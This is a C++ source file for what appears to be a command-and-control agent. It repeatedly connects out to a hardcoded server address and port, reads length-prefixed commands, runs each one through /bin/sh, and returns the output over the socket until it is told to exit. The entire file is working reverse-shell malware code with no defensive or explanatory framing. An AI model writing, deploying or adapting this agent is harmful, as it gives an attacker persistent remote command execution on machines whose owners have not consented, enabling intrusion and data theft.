#include <iostream>
#include <vector>
#include <string>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

struct PacketHeader {
    uint32_t command_id;
    uint32_t data_len;
};

bool read_exact(int sock, uint8_t* buffer, size_t size) {
    size_t total_read = 0;
    while (total_read < size) {
        ssize_t bytes_read = recv(sock, buffer + total_read, size - total_read, 0);
        if (bytes_read <= 0) return false;
        total_read += bytes_read;
    }
    return true;
}

std::string execute_command(const std::string& command) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return "[-] Error: pipe\n";

    pid_t pid = fork();
    if (pid == -1) return "[-] Error: fork\n";

    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);

        execl("/bin/sh", "sh", "-c", command.c_str(), nullptr);
        exit(1);
    } 
    else {
        close(pipefd[1]);
        std::string output;
        char buffer[4096];
        ssize_t bytes_read;

        while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
            output.append(buffer, bytes_read);
        }
        close(pipefd[0]);
        waitpid(pid, nullptr, 0);

        if (output.empty()) {
            return "[No output].\n";
        }
        return output;
    }
}

int main() {
    const char* server_ip = "127.0.0.1";
    int port = 9001;

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(5);
            continue;
        }

        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sleep(5);
            continue;
        }

        bool session_active = true;
        bool terminate_agent = false;

        while (session_active){

            PacketHeader req_header{};
            
            if (!read_exact(sock, reinterpret_cast<uint8_t*>(&req_header), sizeof(req_header))) {
                break;
            }

            req_header.command_id = ntohl(req_header.command_id);
            req_header.data_len = ntohl(req_header.data_len);

            switch (req_header.command_id) {
                case 1: { // Command execution
                    std::vector<uint8_t> payload_buffer(req_header.data_len);
                    if (read_exact(sock, payload_buffer.data(), req_header.data_len)) {
                        std::string command(payload_buffer.begin(), payload_buffer.end());
                        
                        std::string result = execute_command(command);

                        PacketHeader resp_header{};
                        resp_header.command_id = htonl(1);
                        resp_header.data_len = htonl(result.size());

                        send(sock, &resp_header, sizeof(resp_header), 0);
                        send(sock, result.c_str(), result.size(), 0);
                    }
                    break;
                }
                case 4: { // exit
                    session_active = false;
                    terminate_agent = true;
                    break;
                }
                default: {
                    break;
                }
            }
        }
        close(sock);
        if (terminate_agent) {
            break;
        }

        sleep(5);
    }
    return 0;
}